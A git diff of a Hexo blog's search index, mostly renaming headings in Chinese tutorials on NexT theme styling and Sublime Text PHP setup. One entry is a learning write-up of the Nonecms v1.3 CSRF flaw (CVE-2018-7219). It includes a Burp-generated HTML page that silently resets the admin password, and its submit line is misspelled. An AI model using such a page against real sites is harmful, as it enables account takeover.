@@ -65,23 +65,14 @@
     <title>Hexo博客搭建之NexT主题美化</title>
     <url>/2021/08/04/Hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B9%8BNexT%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96/</url>
     <content><![CDATA[<h2 id="安装-NexT"><a href="#安装-NexT" class="headerlink" title="安装 NexT"></a>安装 NexT</h2><p>Hexo 安装主题的方式非常简单，只需要将主题文件拷贝至站点目录的 <code>themes</code> 目录下， 然后修改下配置文件即可，安装步骤如下：</p>
-<ol>
-<li>下载</li>
-</ol>
-<p>在终端窗口下，定位到 <code>Hexo</code> 站点目录下。使用 <code>git</code> 代码：</p>
+<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>在终端窗口下，定位到 <code>Hexo</code> 站点目录下。使用 <code>git</code> 代码：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/theme-next/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>
 
-<ol start="2">
-<li>启用</li>
-</ol>
-<p>与所有 Hexo 主题启用的模式一样。 当 <span class="label default">克隆/下载</span> 完成后，打开 <span class="label warning">站点配置文件</span> ， 找到 <code>theme</code> 字段，并将其值更改为 <code>next</code>:</p>
-<figure class="highlight yml"><figcaption><span>_config.yml   启用 NexT 主题</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">theme:</span> <span class="string">next</span></span><br></pre></td></tr></table></figure>
+<h3 id="启用"><a href="#启用" class="headerlink" title="启用"></a>启用</h3><p>与所有 Hexo 主题启用的模式一样。 当 <span class="label default">克隆/下载</span> 完成后，打开 <span class="label warning">站点配置文件</span> ， 找到 <code>theme</code> 字段，并将其值更改为 <code>next</code>:</p>
+<figure class="highlight yml"><figcaption><span>_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">theme:</span> <span class="string">next</span></span><br></pre></td></tr></table></figure>
 
 <p>到此，NexT 主题安装完成，下一步将验证主题是否正确启用。在切换主题之后、验证之前，最好使用 <code> hexo clean</code> 来清除 Hexo 的缓存。</p>
-<ol start="3">
-<li>验证</li>
-</ol>
-<p>首先启动 Hexo 本地站点，并开启调试模式（ <code>hexo s --debug</code> ），在服务启动的过程，注意观察命令行输出是否有任何异常信息，当命令行输出中提示出：</p>
+<h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>首先启动 Hexo 本地站点，并开启调试模式（ <code>hexo s --debug</code> ），在服务启动的过程，注意观察命令行输出是否有任何异常信息，当命令行输出中提示出：</p>
 <p><code>INFO  Hexo is running at http://0.0.0.0:4000/. Press Ctrl+C to stop.</code></p>
 <p>此时即可使用浏览器访问 <code>http://localhost:4000</code>，检查站点是否正确运行。</p>
 <p>当站点的外观与下图所示类似时即说明已成功安装 NexT 主题。这是 NexT 默认的 Scheme —— Muse .</p>
@@ -118,7 +109,7 @@
 <li>hide - 在所有页面中都隐藏（可以手动展开）</li>
 <li>remove - 完全移除</li>
 </ul>
-<h3 id="头像"><a href="#头像" class="headerlink" title="头像"></a>头像</h3><p>编辑 <span class="label success">主题配置文件</span>， 修改字段 <code>avatar</code>， 值设置成头像的链接地址。其中，头像的链接地址可以是 <span class="label default">一个完整的互联网url</span> 或 <span class="label default">站点内的地址</span> 。</p>
+<h3 id="设置头像"><a href="#设置头像" class="headerlink" title="设置头像"></a>设置头像</h3><p>编辑 <span class="label success">主题配置文件</span>， 修改字段 <code>avatar</code>， 值设置成头像的链接地址。其中，头像的链接地址可以是 <span class="label default">一个完整的互联网url</span> 或 <span class="label default">站点内的地址</span> 。</p>
 <figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment"># Sidebar Avatar</span></span><br><span class="line"><span class="attr">avatar:</span></span><br><span class="line">  <span class="attr">url:</span> <span class="string">/images/xin.jpg</span>   <span class="comment"># 头像图片放置在themes/next/source/images目录下</span></span><br><span class="line">  <span class="attr">rounded:</span> <span class="literal">false</span> <span class="comment"># 鼠标放在头像上时是否旋转</span></span><br><span class="line">  <span class="attr">rotated:</span> <span class="literal">false</span>  <span class="comment"># 头像是否设为圆形，否则为矩形</span></span><br></pre></td></tr></table></figure>
 
 <h3 id="设置作者昵称及站点描述"><a href="#设置作者昵称及站点描述" class="headerlink" title="设置作者昵称及站点描述"></a>设置作者昵称及站点描述</h3><p>编辑 <span class="label warning">站点配置文件</span> ， 设置 <code>author</code> 为作者昵称，设置 <code>description</code> 字段为站点描述,可以是喜欢的一句签名:)</p>
@@ -142,7 +133,7 @@
             <p><i class="fa fa-info-circle"></i> 这里要注意确保在主题配置文件的 menu 字段中添加了 tags 和 categories 页面</p>
           </div>
 
-<h3 id="腾讯公益404"><a href="#腾讯公益404" class="headerlink" title="腾讯公益404"></a>腾讯公益404</h3><p>与上面类似，也是通过新增页面的方法来添加该页面，编辑页面内容为腾讯公益404页面即可。寻找丢失儿童，让大家一起关注此项公益事业！</p>
+<h3 id="添加腾讯公益-404"><a href="#添加腾讯公益-404" class="headerlink" title="添加腾讯公益 404"></a>添加腾讯公益 404</h3><p>与上面类似，也是通过新增页面的方法来添加该页面，编辑页面内容为腾讯公益404页面即可。寻找丢失儿童，让大家一起关注此项公益事业！</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new page 404</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight html"><figcaption><span>source/404/index.html</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8;&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge,chrome=1&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;robots&quot;</span> <span class="attr">content</span>=<span class="string">&quot;all&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;robots&quot;</span> <span class="attr">content</span>=<span class="string">&quot;index,follow&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://qzone.qq.com/gy/404/style/404style.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/plain&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://www.qq.com/404/search_children.js&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> <span class="attr">homePageUrl</span>=<span class="string">&quot;/&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">homePageName</span>=<span class="string">&quot;回到我的主页&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://qzone.qq.com/gy/404/data.js&quot;</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://qzone.qq.com/gy/404/page.js&quot;</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
@@ -151,16 +142,16 @@
             <p><i class="fa fa-info-circle"></i> 主题配置文件的 menu 字段中已经包含了 commonweal：/404/ ，直接在 menu 字段添加就可以了</p>
           </div>
 
-<h3 id="关于我"><a href="#关于我" class="headerlink" title="关于我"></a>关于我</h3><p>原理同上，首先新建一个 <code>about</code> 页面，然后编辑 <code>index.md</code> 即为页面显示内容</p>
+<h3 id="添加-about-页面"><a href="#添加-about-页面" class="headerlink" title="添加 about 页面"></a>添加 about 页面</h3><p>原理同上，首先新建一个 <code>about</code> 页面，然后编辑 <code>index.md</code> 即为页面显示内容</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new page about</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight yml"><figcaption><span>source/about/index.md</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">About</span> <span class="string">Me</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2021-07-30 18:45:37</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;about&quot;</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="string">Welcome</span> <span class="string">to</span> <span class="string">xinkjung&#x27;s</span> <span class="string">blog!</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/images/menu.png" alt="菜单栏效果预览"></p>
-<h3 id="代码高亮-复制"><a href="#代码高亮-复制" class="headerlink" title="代码高亮/复制"></a>代码高亮/复制</h3><p>NexT 主题的代码块默认使用白色的 <code>normal</code> 主题，可选的值有 <code>normal</code> 、 <code>night</code> 、  <code>night blue</code> 、 <code>night bright</code> 、 <code>night eighties</code> 、 <code>solarized</code> 、 <code>solarized</code> 、 <code>dark</code> 、 <code>galactic</code> ，可以在 <span class="label success">主题配置文件</span> 中进行设置：</p>
+<h3 id="设置代码高亮-复制"><a href="#设置代码高亮-复制" class="headerlink" title="设置代码高亮/复制"></a>设置代码高亮/复制</h3><p>NexT 主题的代码块默认使用白色的 <code>normal</code> 主题，可选的值有 <code>normal</code> 、 <code>night</code> 、  <code>night blue</code> 、 <code>night bright</code> 、 <code>night eighties</code> 、 <code>solarized</code> 、 <code>solarized</code> 、 <code>dark</code> 、 <code>galactic</code> ，可以在 <span class="label success">主题配置文件</span> 中进行设置：</p>
 <figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">codeblock:</span></span><br><span class="line">  <span class="attr">highlight_theme:</span> <span class="string">normal</span></span><br><span class="line">  <span class="attr">copy_button:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span>  <span class="comment"># 显示代码复制按钮</span></span><br><span class="line">    <span class="attr">show_result:</span> <span class="literal">true</span>  <span class="comment"># 展示复制结果</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="侧边栏社交"><a href="#侧边栏社交" class="headerlink" title="侧边栏社交"></a>侧边栏社交</h3><p>通过 <span class="label success">主题配置文件</span> 中的 <code>social</code> 字段进行设置，其键值格式是 <code>显示文本: 链接地址 || 图标名称</code> ：</p>
+<h3 id="设置侧边栏社交"><a href="#设置侧边栏社交" class="headerlink" title="设置侧边栏社交"></a>设置侧边栏社交</h3><p>通过 <span class="label success">主题配置文件</span> 中的 <code>social</code> 字段进行设置，其键值格式是 <code>显示文本: 链接地址 || 图标名称</code> ：</p>
 <figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">social:</span></span><br><span class="line">  <span class="attr">GitHub:</span> <span class="string">https://github.com/xinkjung</span> <span class="string">||</span> <span class="string">fab</span> <span class="string">fa-github</span></span><br><span class="line">  <span class="attr">E-Mail:</span> <span class="string">mailto:xinkjung@163.com</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-envelope</span></span><br><span class="line">  <span class="comment">#Weibo: https://weibo.com/yourname || fab fa-weibo</span></span><br><span class="line">  <span class="comment">#Google: https://plus.google.com/yourname || fab fa-google</span></span><br><span class="line">  <span class="comment">#Twitter: https://twitter.com/yourname || fab fa-twitter</span></span><br><span class="line">  <span class="comment">#YouTube: https://youtube.com/yourname || fab fa-youtube</span></span><br><span class="line">  <span class="attr">Instagram:</span> <span class="string">https://instagram.com/xinkjung</span> <span class="string">||</span> <span class="string">fab</span> <span class="string">fa-instagram</span></span><br><span class="line">  <span class="comment">#Skype: skype:yourname?call|chat || fab fa-skype</span></span><br><span class="line"></span><br><span class="line"><span class="attr">social_icons:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>    <span class="comment"># 是否显示社交图标</span></span><br><span class="line">  <span class="attr">icons_only:</span> <span class="literal">false</span>    <span class="comment"># 是否只显示社交图标</span></span><br><span class="line">  <span class="attr">transition:</span> <span class="literal">false</span>    </span><br></pre></td></tr></table></figure>
 
 <p><img src="/images/sidebar.png" alt="侧栏效果预览"></p>
@@ -168,7 +159,7 @@
 <figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">reward_settings:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>  <span class="comment">#false</span></span><br><span class="line">  <span class="attr">animation:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">comment:</span> <span class="string">请我喝杯奶茶吧～</span></span><br><span class="line"></span><br><span class="line"><span class="attr">reward:</span></span><br><span class="line">  <span class="attr">wechatpay:</span> <span class="string">/images/wechatpay.png</span></span><br><span class="line">  <span class="attr">alipay:</span> <span class="string">/images/alipay.png</span></span><br><span class="line">  <span class="comment">#paypal: /images/paypal.png</span></span><br><span class="line">  <span class="comment">#bitcoin: /images/bitcoin.png</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/images/reward.png" alt="打赏效果预览"></p>
-<h3 id="站点建立时间"><a href="#站点建立时间" class="headerlink" title="站点建立时间"></a>站点建立时间</h3><p>这个时间将在站点的底部显示，例如 © 2013 - 2015。 编辑 <span class="label success">主题配置文件</span>，修改字段 <code>since</code> 内容，同时文章底部的布局也都可以在 <code>footer</code> 字段下进行设置：</p>
+<h3 id="设置底部布局"><a href="#设置底部布局" class="headerlink" title="设置底部布局"></a>设置底部布局</h3><p>站点建立时间可以在站点的底部显示，例如 © 2013 - 2015。 编辑 <span class="label success">主题配置文件</span>，修改字段 <code>since</code> 内容，同时文章底部的布局也都可以在 <code>footer</code> 字段下进行设置：</p>
 <figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">footer:</span></span><br><span class="line">  <span class="attr">since:</span> <span class="number">2018</span></span><br><span class="line">  <span class="attr">icon:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">fa</span> <span class="string">fa-heart</span></span><br><span class="line">    <span class="attr">animated:</span> <span class="literal">false</span>   <span class="comment"># 图标是否闪烁</span></span><br><span class="line">    <span class="attr">color:</span> <span class="string">&quot;#D3D3D3&quot;</span>   <span class="comment"># 图标颜色，这里是亮灰色</span></span><br><span class="line">  <span class="attr">copyright:</span>    <span class="comment"># 如果不设置，将会默认显示站点作者名称</span></span><br><span class="line">  <span class="attr">powered:</span> <span class="literal">false</span>  <span class="comment"># true  # 是否显示 Powered by Hexo &amp; NexT</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/images/footer.png" alt="底部效果预览"></p>
@@ -196,7 +187,7 @@
             <p><i class="fa fa-info-circle"></i> 写文章时标题跨级否则取消自动生成数字标号后显示会错乱（一级标题后必须跟二级标题，二级标题后必须跟三级标题，以此类推）</p>
           </div>
 
-<h3 id="文章结束标志"><a href="#文章结束标志" class="headerlink" title="文章结束标志"></a>文章结束标志</h3><p>为了使得文章页面更美观，还可以为其设置一个文章结束标志，以此为分界线。在路径 <code>themes/next/layout/_macro</code> 中新建 <code>passage-end-tag.swig</code> 文件，并添加以下内容：</p>
+<h3 id="添加文章结束标志"><a href="#添加文章结束标志" class="headerlink" title="添加文章结束标志"></a>添加文章结束标志</h3><p>为了使得文章页面更美观，还可以为其设置一个文章结束标志，以此为分界线。在路径 <code>themes/next/layout/_macro</code> 中新建 <code>passage-end-tag.swig</code> 文件，并添加以下内容：</p>
 <figure class="highlight plaintext"><figcaption><span>themes/next/layout/_macro/passage-end-tag.swig</span></figcaption><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &#123;% if not is_index %&#125;</span><br><span class="line">        &lt;div style=&quot;text-align:center;color: #ccc;font-size:14px;&quot;&gt;------------- &lt;i class=&quot;fa fa-paw&quot;&gt;&lt;/i&gt; 本文结束感谢您的阅读 &lt;i class=&quot;fa fa-paw&quot;&gt;&lt;/i&gt; -------------&lt;/div&gt;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
 <p>接着打开 <code>themes/next/layout/_macro/post.swig</code> 文件，在 <code>post-body</code> 之后( <code>END POST BODY</code> )， <code>post-footer</code> 之前添加如下代码：</p>
 <figure class="highlight plaintext"><figcaption><span>themes/next/layout/_macro/post.swig</span></figcaption><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &#123;% if not is_index %&#125;</span><br><span class="line">        &#123;% include &#x27;passage-end-tag.swig&#x27; %&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
@@ -205,14 +196,14 @@
 <figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment"># 文章末尾添加“本文结束”标记</span></span><br><span class="line"><span class="attr">passage_end_tag:</span></span><br><span class="line">  <span class="attr">enabled:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/images/thanksline.png" alt="结束标志效果预览"></p>
-<h3 id="文章版权信息"><a href="#文章版权信息" class="headerlink" title="文章版权信息"></a>文章版权信息</h3><p>很多人是自己手动写入的文件来添加文章版权信息，为了方便也可以直接在 <span class="label success">主题配置文件</span> 中开启博客的版权功能：</p>
+<h3 id="添加文章版权信息"><a href="#添加文章版权信息" class="headerlink" title="添加文章版权信息"></a>添加文章版权信息</h3><p>很多人是自己手动写入的文件来添加文章版权信息，为了方便也可以直接在 <span class="label success">主题配置文件</span> 中开启博客的版权功能：</p>
 <figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">creative_commons:</span></span><br><span class="line">  <span class="attr">license:</span> <span class="string">by-nc-sa</span></span><br><span class="line">  <span class="attr">sidebar:</span> <span class="literal">false</span>    <span class="comment"># true，侧边栏显示版权©️</span></span><br><span class="line">  <span class="attr">post:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">language:</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/images/copyright.png" alt="版权信息效果预览"></p>
-<h3 id="图片放大"><a href="#图片放大" class="headerlink" title="图片放大"></a>图片放大</h3><p>针对文章中的图片可能看不清的情况，可以在 <span class="label success">主题配置文件</span> 中找到 <code>fancybox</code> 字段并更改参数：</p>
+<h3 id="添加图片放大功能"><a href="#添加图片放大功能" class="headerlink" title="添加图片放大功能"></a>添加图片放大功能</h3><p>针对文章中的图片可能看不清的情况，可以在 <span class="label success">主题配置文件</span> 中找到 <code>fancybox</code> 字段并更改参数：</p>
 <figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">fancybox:</span> <span class="literal">true</span>   <span class="comment"># false</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="本地搜索"><a href="#本地搜索" class="headerlink" title="本地搜索"></a>本地搜索</h3><p>该功能由 <code>hexo-generator-searchdb</code> 提供，效果如下图：</p>
+<h3 id="开启本地搜索功能"><a href="#开启本地搜索功能" class="headerlink" title="开启本地搜索功能"></a>开启本地搜索功能</h3><p>该功能由 <code>hexo-generator-searchdb</code> 提供，效果如下图：</p>
 <p><img src="/images/search.png" alt="本地搜索效果预览"><br>首先需要在根目录下执行以下命令来安装相关依赖：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure>
 
@@ -720,7 +711,7 @@ $ hexo d # == hexo deploy 上传
   <entry>
     <title>Nonecms v1.3后台CSRF漏洞(CVE-2018-7219)</title>
     <url>/2021/08/01/Nonecms%20v1.3%E5%90%8E%E5%8F%B0CSRF%E6%BC%8F%E6%B4%9E(CVE-2018-7219)/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>此次实践只是为了学习知识，巩固一下网络攻防，增强动手能力。</p>
+    <content><![CDATA[<p>此次实践只是为了学习知识，巩固一下网络攻防，增强动手能力。</p>
 <span id="more"></span>
 
 
@@ -728,15 +719,17 @@ $ hexo d # == hexo deploy 上传
 <p>以修改管理员密码为例，来说明漏洞详情：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">        $params = input(&#x27;post.&#x27;);</span><br><span class="line">            $data = [</span><br><span class="line">                &#x27;username&#x27; =&gt; $params[&#x27;user_name&#x27;],</span><br><span class="line">                &#x27;password&#x27; =&gt;  $params[&#x27;password&#x27;],</span><br><span class="line">                &#x27;email&#x27; =&gt; $params[&#x27;email&#x27;],</span><br><span class="line">                &#x27;islock&#x27; =&gt; $params[&#x27;islock&#x27;],</span><br><span class="line">                &#x27;repassword&#x27; =&gt; $params[&#x27;repassword&#x27;]</span><br><span class="line">            ];</span><br><span class="line">---------------------------------------------------------   </span><br><span class="line"></span><br><span class="line">     /**</span><br><span class="line">     * 修改用户信息</span><br><span class="line">     */</span><br><span class="line">    public function edit($id)</span><br><span class="line">    &#123;</span><br><span class="line">        $data = Db::name(&#x27;admin&#x27;)-&gt;find($id);</span><br><span class="line">        $this-&gt;assign(&#x27;data&#x27;, $data);</span><br><span class="line">        return $this-&gt;fetch();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
 <p>根据代码（application/admin/controller/Admin.php ）可以发现，由于没有加入token只需要输入新密码即可，因此这里存在着CSRF漏洞。</p>
-<p>我们首先记录管理员初始密码的md5值，方便后面对比<br><img src="/imges/Nonecms/nonecms1.PNG" alt="nonecms1"></p>
-<p>抓包查看参数，发现并没有token参数限制，并且不需要我们输入旧密码，所以直接CSRF即可~<br><img src="/imges/Nonecms/nonecms4.png" alt="nonecms4"></p>
-<p>于是我们制作一个恶意网页，诱导管理员点击该网页，便可达到修改管理员的目的。<br><img src="/imges/Nonecms/nonecms3_crsf.PNG" alt="nonecms3_csrf"></p>
+<p>我们首先记录管理员初始密码的md5值，方便后面对比<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms1.PNG" alt="nonecms1"></p>
+<p>抓包查看参数，发现并没有token参数限制，并且不需要我们输入旧密码，所以直接CSRF即可~<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms4.png" alt="nonecms4"></p>
+<p>于是我们制作一个恶意网页，诱导管理员点击该网页，便可达到修改管理员的目的。<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms3_crsf.PNG" alt="nonecms3_csrf"></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt;</span><br><span class="line">    &lt;form action=&quot;http://127.0.0.1/public/index.php/admin/admin/edit.html&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;nonecms&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;admin&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;repassword&quot; value=&quot;admin&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;role&amp;#95;id&quot; value=&quot;&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;islock&quot; value=&quot;0&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;1&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;script&gt;docuemnt.form[0].submit();&lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
 
-<p>这时再查看数据库发现后台管理员密码已被修改！<br><img src="/imges/Nonecms/nonecms2.PNG" alt="nonecms2"></p>
+<p>这时再查看数据库发现后台管理员密码已被修改！<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms2.PNG" alt="nonecms2"></p>
 <p>同样的，我们也可以利用CSRF请求来新添一位管理员用户</p>
 <p>到此，此次实验完成！！！<br><img src="https://github.com/xinkjung/Photos/raw/master/IMG_2872.GIF" alt="happy"></p>
-<p>参考链接<br><a href="http://foreversong.cn/archives/1081">http://foreversong.cn/archives/1081</a></p>
+<h4> 参考链接</h4>
+
+<p><a href="http://foreversong.cn/archives/1081">http://foreversong.cn/archives/1081</a></p>
 ]]></content>
       <categories>
         <category>CVE</category>
@@ -749,7 +742,7 @@ $ hexo d # == hexo deploy 上传
   <entry>
     <title>Sublime text3配置PHP</title>
     <url>/2021/08/01/Sublime-text3%E9%85%8D%E7%BD%AEPHP/</url>
-    <content><![CDATA[<h1 id="sublime-text3配置PHP环境"><a href="#sublime-text3配置PHP环境" class="headerlink" title="sublime text3配置PHP环境"></a>sublime text3配置PHP环境</h1><blockquote>
+    <content><![CDATA[<h4 id="sublime-text3配置PHP环境"><a href="#sublime-text3配置PHP环境" class="headerlink" title="sublime text3配置PHP环境"></a>sublime text3配置PHP环境</h4><blockquote>
 <p>准备</p>
 </blockquote>
 <ul>
@@ -781,7 +774,7 @@ $ hexo d # == hexo deploy 上传
 
 <p>然后保存在默认路径下，并修改文件名为php.sublime-build，到此就OK啦！！！<br>重启sublime text3，随便输入php代码，再按”ctrl+B”就可以编译了。</p>
 <p><img src="https://github.com/xinkjung/Photos/raw/master/helloworld.jpg" alt="php-hw"><br><img src="https://github.com/xinkjung/Photos/raw/master/hw-result.jpg" alt="php-result"></p>
-<h1 id="Sublime-text3配置浏览器预览"><a href="#Sublime-text3配置浏览器预览" class="headerlink" title="Sublime text3配置浏览器预览"></a>Sublime text3配置浏览器预览</h1><blockquote>
+<h4 id="Sublime-text3配置浏览器预览"><a href="#Sublime-text3配置浏览器预览" class="headerlink" title="Sublime text3配置浏览器预览"></a>Sublime text3配置浏览器预览</h4><blockquote>
 <p>准备</p>
 </blockquote>
 <ul>
